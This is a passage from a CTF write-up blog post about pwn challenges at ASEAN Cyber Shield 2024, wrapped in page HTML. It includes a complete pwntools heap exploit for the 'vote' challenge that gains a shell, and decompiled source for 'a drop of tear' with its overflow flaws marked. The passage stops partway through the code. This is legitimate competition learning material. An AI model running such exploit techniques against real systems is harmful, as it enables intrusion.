with it too since I couldn’t write one more pointer, as that will make the overwrite not work. (Since then its not a 0x30 chunk that’s allocated anymore.)\nI then tried to setup a gets() call to further write the rop chain, but that didn’t work as well.\nIn the end, I managed to use this one_gadget:\n0x50a37 posix_spawn(rsp+0x1c, \"/bin/sh\", 0, rbp, rsp+0x60, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL Before the ret instruction of add_ctf() is executed, there is a pop rbp instruction:\n→ 0x555555556c2d pop rbp 0x555555556c2e ret 0x00007fffffffe2a0│+0x0000: 0x00007fffffffe2c0 → 0x0000000000000001 ← $rsp, $rbp 0x00007fffffffe2a8│+0x0008: 0x00005555555572b6 → jmp 0x555555557289 Our overwrite starts at 0x7fffffffe2a0, so we can just write a null there, and make rbp = NULL.\nrsp \u0026 0xf == 0 is also true, so two out of three constraints of the one_gadget is met.\nThe rcx however is set to some libc address. We can make it null simply by using a pop rcx gadget and setting up a null:\npayload = p64(0) + pop_rcx + p64(0) + one_gadget And with that, we get a shell!\nBoth the tear and vote challenges are actually made by my friend Ainsetin!\nAfter the ctf, he told me that he exploited this challenge by faking vector objects in topic (that’s how I learned that the topics were actually stored in vectors), not through tcache poisioning. So if you want to see his exploit, maybe you can contact him.\nexploit.py:\nfrom pwn import * #io = process(\"./vote\",aslr=False) io = remote(\"127.0.0.1\",13337) libc = ELF(\"./libc.so.6\") def add_ctf(idx,name,topic_cnt,do_photo,width,height,photo,topics=[]): io.sendlineafter(b\"input:\",b\"1\") io.sendlineafter(b\"idx\",str(idx).encode()) io.sendlineafter(b\"name\",name) io.sendlineafter(b\"topic cnt\",str(topic_cnt).encode()) for i in range(topic_cnt): io.sendlineafter(b\"topic\u003e\",topics[i]) if do_photo: io.sendlineafter(b\"photo?\",b\"y\") io.sendlineafter(b\"width?\",str(width).encode()) io.sendlineafter(b\"height\",str(height).encode()) io.sendafter(b\"reading photo below\u003e\u003e\",photo) else: io.sendlineafter(b\"photo?\",b\"n\") def vote_ctf(idx): io.sendlineafter(b\"input:\",b\"2\") resp = io.recvuntil(b\"ctf idx:\") io.sendline(str(idx).encode()) return resp def remove_ctf(idx): io.sendlineafter(b\"input:\",b\"3\") io.sendlineafter(b\"idx?\",str(idx).encode()) def mangle(dest,pos): return (pos \u003e\u003e 12) ^ dest # leak heap and libc add_ctf(0,b\"AAAA\",1,False,0,0,0,topics=[\"a\"]) # make topic to prevent consolidation add_ctf(1,b\"BBBB\",1,False,0,0,0,topics=[\"b\"]) remove_ctf(0) remove_ctf(1) payload = b\"A\"*0x900 + p64(0x1337133713371337) add_ctf(0,b\"AAAA\",1,True,-32767,-1,payload,topics=[\"a\"]) io.recvuntil(p64(0x1337133713371337)) heap_base = u64(io.recv(6) + b\"\\x00\\x00\") - 0x131a0 log.info(\"HEAP BASE: \" + hex(heap_base)) remove_ctf(0) fake_str = p64(heap_base+0x11eb0) + p64(6) payload = fake_str.ljust(0x900,b\"\\x00\") + p64(0x1337133713371337) + p64(heap_base+0x12878) + p64(heap_base+0x12898) + p64(heap_base+0x12898) add_ctf(0,b\"AAAA\",1,True,-32767,-1,payload,topics=[\"a\"]) libc.address = u64(vote_ctf(0)[0x5d:0x5d+6]+b\"\\x00\\x00\") - 0x219ce0 log.info(\"LIBC BASE: \" + hex(libc.address)) add_ctf(1,b\"placeholder\",1,False,0,0,0,topics=[\"a\"]) # leak environ fake_str = p64(libc.address+0x221200) + p64(10) payload = fake_str.ljust(0x900,b\"\\x00\") + p64(0x1337133713371337) + p64(heap_base+0x13208) + p64(heap_base+0x13228) + p64(heap_base+0x13228) add_ctf(2,b\"AAAA\",1,True,-32767,-1,payload,topics=[\"a\"]) environ = u64(vote_ctf(0)[0x108:0x108+8]) log.info(\"ENVIRON: \" + hex(environ)) # all bins are empty now, setup heap for tcache poisoning add_ctf(3,b\"AAAA\",1,False,0,0,0,topics=[b\"A\"*0x20]) # for some reason, this will free a 0x50 chunk add_ctf(4,b\"AAAA\",1,False,0,0,0,topics=[b\"A\"*0x20]) # this sets it up so that two 0x30 chunks are together remove_ctf(4) # in memory, there is now: free object chunk, followed by two 0x30 tcache chunks #gdb.attach(io,gdbscript=\"x/8gx 0x55555555c2c0\\n heap set-arena 0x1555552acc80\") # overwrite fd ptr in tcache ret = environ - 0x148 fd_overwrite = b\"A\"*0x900 + p64(0x1337133713371337) + p64(0)*2 fd_overwrite += p64(0) + p64(0x31) + p64(mangle(ret,heap_base+0x14ed0)) add_ctf(5,b\"AAAA\",0,True,-32767,-1,fd_overwrite) # overwrite ret pointer #gdb.attach(io,gdbscript=\"break *0x555555556c2e\") pop_rcx = p64(libc.address + 0x8c6bb) one_gadget = p64(libc.address+0x50a37) payload = p64(0) + pop_rcx + p64(0) + one_gadget add_ctf(6,b\"AAAA\",1,False,0,0,0,topics=[payload]) io.interactive() Conclusion This was the first time I got on the podium after playing so many ctfs, and to do it representing Malaysia, was really exciting. I really have to thank my teammates Firdaus, Teng, Raihan, for all of their hardwork. Also thanks to the entirety of team Malaysia for making the trip so fun, everyone did great!\nThanks a lot to the organisers as well, the hotel and venue they booked were really top tier. I had a lot of fun with the pwn challs too, but I think some of them required too much reversing, and they should’ve given the source code.\nHappy that I met quite a few friends from previous events too! Ha Long Bay was great, really good food, and really nice views. Had a great time.\n",
+  "wordCount" : "5218",
+  "inLanguage": "en",
+  "datePublished": "2024-12-17T09:38:09+08:00",
+  "dateModified": "2024-12-17T09:38:09+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zh1ren.github.io/posts/acs24/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zhiren",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zh1ren.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zh1ren.github.io/" accesskey="h" title="zhiren (Alt + H)">zhiren</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zh1ren.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://zh1ren.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://zh1ren.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      ASEAN Cyber Shield 2024
+    </h1>
+    <div class="post-meta"><span title='2024-12-17 09:38:09 +0800 +08'>December 17, 2024</span>&nbsp;·&nbsp;25 min
+
+</div>
+  </header> 
+  <div class="post-content"><p><img loading="lazy" src="/acs24/acs_msia.jpg" alt=""  />
+</p>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>My team Copi Kincau (comprised of <a href="https://vicevirus.github.io/">Firdaus</a>, <a href="https://tzion0.github.io/">Teng</a>, <a href="https://www.linkedin.com/in/noorraihan/">Raihan</a>, and me) was one of 4 teams that represented Malaysia in this year&rsquo;s ASEAN Cyber Shield. We travelled to Ha Long Bay, Vietnam during November to play in the ctf, and managed to get 3rd in the student category!</p>
+<p><img loading="lazy" src="/acs24/scoreboard.png" alt=""  />
+</p>
+<p>The ctf was organised by <a href="https://www.kisa.or.kr/">KISA</a>, and had teams from all the ASEAN countries. It had some difficult and high quality pwn challs, and I&rsquo;ll be sharing the writeups of two of them in this post.<br>
+(was busy, so post is almost a month late)</p>
+<p>All attachments can be found <a href="https://github.com/zh1ren/ctf/tree/main/acs/attachments">here</a>.</p>
+<blockquote>
+<p>Special thanks to <a href="https://www.rehack.xyz/home/">RE:HACK</a> and <a href="https://www.nacsa.gov.my/">NACSA</a> for selecting us to represent Malaysia and the support given by them throughout the contest.</p>
+</blockquote>
+<h2 id="a-drop-of-tear-pwn">a drop of tear (pwn)<a hidden class="anchor" aria-hidden="true" href="#a-drop-of-tear-pwn">#</a></h2>
+<blockquote>
+<p>I was really happy that I solved this one since only 2 teams out of all 37 teams in the preliminary solved it!</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span></code></pre></div>
+
+<p><details >
+  <summary markdown="span"><strong>src.c</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// from ghidra decompilation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  local_14 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/home/acs_ctf/flag&#34;</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(local_14,<span style="color:#f92672">&amp;</span>local_18,<span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">srand</span>(local_18);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdin,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">signal</span>(<span style="color:#ae81ff">0xe</span>,exit);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">signal</span>(<span style="color:#ae81ff">0xb</span>,correct_indicate);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">alarm</span>(<span style="color:#ae81ff">0x78</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init</span>();
+</span></span><span style="display:flex;"><span>  local_134 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>;
+</span></span><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xcafebabe</span>;
+</span></span><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1337c0d3</span>;
+</span></span><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x79427942</span>;
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;a drop of tear makes me relieved.&#34;</span>);
+</span></span><span style="display:flex;"><span>    local_134 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_signedint</span>(<span style="color:#f92672">&amp;</span>local_134);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_134 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10001</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">guessed_num</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)local_134 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10002</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (local_134 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x67</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;one drop of tear will be dropped.&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)local_134 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x68</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (local_134 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x65</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;test your luck.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%c&#34;</span>,<span style="color:#f92672">&amp;</span>local_130);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x44</span> <span style="color:#f92672">&lt;</span> local_130) {
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;wrong choice&#34;</span>);
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            local_130 <span style="color:#f92672">=</span> local_128[(<span style="color:#66d9ef">int</span>)((local_130 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x41</span>)]; <span style="color:#75715e">//&lt;-- NEGATIVE INDEX VULN
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;what if choice is.....?&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%c&#34;</span>,<span style="color:#f92672">&amp;</span>local_135);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (local_135 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>) {
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;divided by...?&#34;</span>);
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>local_12c);
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>              local_130 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)local_130 <span style="color:#f92672">/</span> local_12c;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> (local_135 <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;0&#39;</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (local_135 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span>) {
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;minus...?&#34;</span>);
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>local_12c);
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>                  local_130 <span style="color:#f92672">=</span> local_130 <span style="color:#f92672">-</span> local_12c;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">if</span> (local_135 <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (local_135 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;*&#39;</span>) {
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;multiply...?&#34;</span>);
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>local_12c);
+</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>                      local_130 <span style="color:#f92672">=</span> local_12c <span style="color:#f92672">*</span> local_130;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                      <span style="color:#66d9ef">if</span> (local_135 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;+&#39;</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;plus...?&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>local_12c);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>                        local_130 <span style="color:#f92672">=</span> local_12c <span style="color:#f92672">+</span> local_130;
+</span></span><span style="display:flex;"><span>                      }
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                  }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>              }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (uVar1 <span style="color:#f92672">==</span> local_130) {
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Correct! wow..&#34;</span>);
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">guessed_num</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;..?&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> LAB_00101a39;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (local_134 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x66</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;test your exploit skill.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>local_118,<span style="color:#ae81ff">0x140</span>); <span style="color:#75715e">// &lt;----- BUFFER OVERFLOW HERE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d is wrong choice.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)local_134);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>LAB_00101a39:
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_signedint</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,param_1,<span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">atoi</span>(param_1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">guessed_num</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  uint local_20;
+</span></span><span style="display:flex;"><span>  uint local_1c;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_18;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_14;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/home/acs_ctf/flag&#34;</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(local_18,<span style="color:#f92672">&amp;</span>local_20,<span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(local_18);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>local_1c);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_20 <span style="color:#f92672">!=</span> local_1c) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Wrong!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Correct&#34;</span>);
+</span></span><span style="display:flex;"><span>  local_14 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/home/acs_ctf/flag&#34;</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(local_14,<span style="color:#f92672">&amp;</span>local_1c,<span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  local_1c <span style="color:#f92672">=</span> local_1c <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffff</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Of course, you are playing %s CTF, right?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>local_1c);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(local_14);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</details></p>
+
+<h3 id="reversing">Reversing<a hidden class="anchor" aria-hidden="true" href="#reversing">#</a></h3>
+<p>The binary loads the first 4 bytes of <code>/home/acs_ctf/flag</code> as the rand() seed.<br>
+It then goes into an infinite loop requesting user input to select options:</p>
+<ul>
+<li><strong>101</strong>: guess the random number</li>
+<li><strong>102</strong>: buffer overflow then return from main</li>
+<li><strong>103</strong>: exit()</li>
+<li><strong>65537</strong>: guessed_num()</li>
+</ul>
+<p>How option <strong>101</strong> works is one byte of user input is requested, and that byte is used to index array <code>local_128</code> through <code>local_128[one_byte_input-0x41)];</code>.</p>
+<p>local_128 is also populated at the start of the process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>;
+</span></span><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xcafebabe</span>;
+</span></span><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1337c0d3</span>;
+</span></span><span style="display:flex;"><span>  local_128[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x79427942</span>;
+</span></span></code></pre></div><p>So if you enter &lsquo;A&rsquo;, index 0 is used, and your current guess is <code>0xdeadbeef</code>.<br>
+You can then perform basic arithmetic operations <code>+-*/</code> on your guess, and that final guess will be used to be compared with the random number generated by rand().</p>
+<p>So if you had <code>0xdeadbeef</code> as your guess, you could +1 to it, and make it <code>0xdeadbef0</code>.</p>
+<p>If your guess was correct, guessed_num() would be called.<br>
+What guessed_num() does is just ask for the first 4 bytes of <code>/home/acs_ctf/flag</code>, and outputs those bytes out again if you get it right.</p>
+<p>You can directly call the guessed_num() function by using option <strong>65537</strong>, but idt its possible to use that option since the program just reads 4 byte from the user for choosing options.</p>
+<p>Option <strong>102</strong> is just a classic bof, but there&rsquo;s a canary and PIE stopping you, so there&rsquo;s not much you can do with just that.</p>
+<h3 id="vulnerabilities">Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#vulnerabilities">#</a></h3>
+<p>The flag format of the ctf is <code>ACS{...}</code>, so the seed of rand() was just <code>ACS{</code>.<br>
+Thus you can always predict what the correct answer is.</p>
+<p>There is also a negative index vuln in the number guessing option:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>local_128[one_byte_input<span style="color:#f92672">-</span><span style="color:#ae81ff">0x41</span>)];
